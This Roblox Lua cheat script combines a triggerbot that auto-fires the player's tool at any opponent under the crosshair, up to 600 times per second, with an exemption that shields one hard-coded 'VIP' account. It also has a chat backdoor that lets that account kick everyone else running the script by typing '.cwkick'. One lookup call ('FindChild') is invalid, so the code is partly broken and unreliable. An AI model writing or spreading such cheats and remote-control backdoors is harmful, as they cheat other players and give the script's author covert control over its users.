-- Triggerbot + VIP Tag System + Toggleable Counter + CWKick via chat (".cwkick")

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local TextChatService = game:GetService("TextChatService")
local Camera = workspace.CurrentCamera

local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()

local Settings = {
    Enabled = false,
    CounterEnabled = true,
    ToggleKey = Enum.KeyCode.Q,
    CounterToggleKey = Enum.KeyCode.L,
    MaxDistance = 1000,
    BlacklistedTools = { "Knife" },
    SpamPerSecond = 600,
}

local VIPUser = "draconvm" -- only this user can issue .cwkick

-- ===== util =====
local BlacklistedTools = {}
for _, name in ipairs(Settings.BlacklistedTools) do
    BlacklistedTools[name] = true
end

local function isAlive(character)
    local hum = character and character:FindFirstChildOfClass("Humanoid")
    return hum and hum.Health > 0
end

local function getUsableTool(character)
    for _, tool in ipairs(character:GetChildren()) do
        if tool:IsA("Tool") and not BlacklistedTools[tool.Name] then
            return tool
        end
    end
end

local function getDistance(a, b)
    local rootA = a:FindFirstChild("HumanoidRootPart") or a:FindFirstChild("Head")
    local rootB = b:FindFirstChild("HumanoidRootPart") or b:FindChild("Head")
    if not rootA or not rootB then return math.huge end
    return (rootA.Position - rootB.Position).Magnitude
end

local function hasLineOfSight(targetChar)
    local camPos = Camera.CFrame.Position
    local targetRoot = targetChar and (targetChar:FindFirstChild("Head") or targetChar:FindFirstChild("HumanoidRootPart"))
    if not targetRoot then return false end

    local params = RaycastParams.new()
    params.FilterType = Enum.RaycastFilterType.Blacklist
    params.FilterDescendantsInstances = { LocalPlayer.Character }

    local result = workspace:Raycast(camPos, (targetRoot.Position - camPos), params)
    return not (result and result.Instance and not result.Instance:IsDescendantOf(targetChar))
end

local function getCrosshairTarget()
    local targetPart = Mouse.Target
    if not targetPart then return end
    local char = targetPart:FindFirstAncestorOfClass("Model")
    if not char or not isAlive(char) then return end
    local player = Players:GetPlayerFromCharacter(char)
    if not player or player == LocalPlayer then return end
    if getDistance(LocalPlayer.Character, char) > Settings.MaxDistance then return end
    if not hasLineOfSight(char) then return end
    if Settings.CounterEnabled and player.Name == VIPUser then
        return nil
    end
    return char
end

-- ===== VIP head tag (client-only) =====
local function attachVIPTag(player)
    if player == LocalPlayer then return end
    if player.Name ~= VIPUser then return end

    local function addTag(char)
        local head = char:WaitForChild("Head", 5)
        if not head then return end
        if char:FindFirstChild("VIP_Billboard") then return end

        local bb = Instance.new("BillboardGui")
        bb.Name = "VIP_Billboard"
        bb.Size = UDim2.new(2, 0, 1, 0)
        bb.StudsOffset = Vector3.new(0, 2, 0)
        bb.AlwaysOnTop = true
        bb.Adornee = head
        bb.Parent = char

        local lbl = Instance.new("TextLabel")
        lbl.BackgroundTransparency = 1
        lbl.Size = UDim2.new(1, 0, 1, 0)
        lbl.TextScaled = true
        lbl.Text = "VIP"
        lbl.Font = Enum.Font.SourceSansBold
        lbl.TextStrokeTransparency = 0
        lbl.TextColor3 = Color3.new(1,1,1)
        lbl.Parent = bb
    end

    if player.Character then addTag(player.Character) end
    player.CharacterAdded:Connect(addTag)
end

for _, p in ipairs(Players:GetPlayers()) do attachVIPTag(p) end
Players.PlayerAdded:Connect(attachVIPTag)

-- ===== toggles =====
UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Settings.ToggleKey then
        Settings.Enabled = not Settings.Enabled
        print("Triggerbot:", Settings.Enabled and "Enabled" or "Disabled")
    elseif input.KeyCode == Settings.CounterToggleKey then
        Settings.CounterEnabled = not Settings.CounterEnabled
        print("Triggerbot Counter:", Settings.CounterEnabled and "Enabled" or "Disabled")
    end
end)

-- ===== triggerbot loop =====
RunService.RenderStepped:Connect(function(dt)
    if not Settings.Enabled then return end
    local myChar = LocalPlayer.Character
    if not myChar or not isAlive(myChar) then return end

    local tool = getUsableTool(myChar)
    if not tool then return end

    local target = getCrosshairTarget()
    if not target then return end

    if tool.Parent ~= myChar then
        local hum = myChar:FindFirstChildOfClass("Humanoid")
        if hum then hum:EquipTool(tool) end
    end

    local spamRate = math.max(1, math.floor(Settings.SpamPerSecond * dt))
    for i = 1, spamRate do
        task.defer(function()
            if tool and tool.Activate then
                tool:Activate()
            end
        end)
    end
end)

-- ===== CWKICK over chat (.cwkick) =====
-- Works only for users running this same script. Only VIPUser can trigger it.

local function handleKickCommandFrom(senderName, messageText)
    if senderName ~= VIPUser then return end             -- only VIP can issue
    if not messageText then return end
    if not messageText:lower():match("^%.cwkick") then return end
    if LocalPlayer.Name == VIPUser then return end        -- don't kick yourself
    LocalPlayer:Kick("Kicked by .cwkick")
end

-- New TextChatService (default in most games)
if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
    TextChatService.MessageReceived:Connect(function(msg)
        -- msg.TextSource contains sender UserId; use that to get Player
        local src = msg.TextSource
        if not src then return end
        local sender = Players:GetPlayerByUserId(src.UserId)
        local text = msg.Text
        handleKickCommandFrom(sender and sender.Name or "", text)
    end)
else
    -- Legacy chat fallback
    local function hookPlayerChat(plr)
        plr.Chatted:Connect(function(text)
            handleKickCommandFrom(plr.Name, text)
        end)
    end
    for _, plr in ipairs(Players:GetPlayers()) do hookPlayerChat(plr) end
    Players.PlayerAdded:Connect(hookPlayerChat)
end
